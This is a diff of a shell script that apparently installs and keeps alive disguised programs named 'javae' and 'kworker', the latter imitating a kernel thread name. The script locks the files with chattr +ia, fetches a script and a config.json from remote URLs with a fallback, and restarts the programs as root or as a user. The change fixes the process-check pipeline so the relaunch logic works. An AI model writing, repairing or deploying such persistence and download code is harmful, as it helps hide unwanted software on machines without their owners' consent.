@@ -653,7 +653,7 @@ if [ "$(id -u)" -eq 0 ]; then
     chmod 777 /etc/javae/javae
     chmod 777 /etc/kworker/kworker
     chattr -R +ia /etc/javae* /etc/kworker*
-    if ! $ps_cmd -fe | grep -q 'javae' | grep -v 'grep'; then
+    if ! $ps_cmd -fe | grep -v 'grep' | grep -q 'javae'; then
         cd /etc/javae
         echo "root not runninng"
         sleep 2
@@ -679,7 +679,7 @@ else
     download_file_if_needed "$sh_url" "/var/tmp/kworker/kworker" "$sh_url_backup"
     downloads "$config_url" "/var/tmp/javae/config.json"
     changeID "/var/tmp/javae"
-    if ! $ps_cmd -fe | grep -q 'javae' | grep -v 'grep'; then
+    if ! $ps_cmd -fe | grep -v 'grep' | grep -q 'javae'; then
         cd /var/tmp/javae
         echo "user not running"
         chmod +x javae
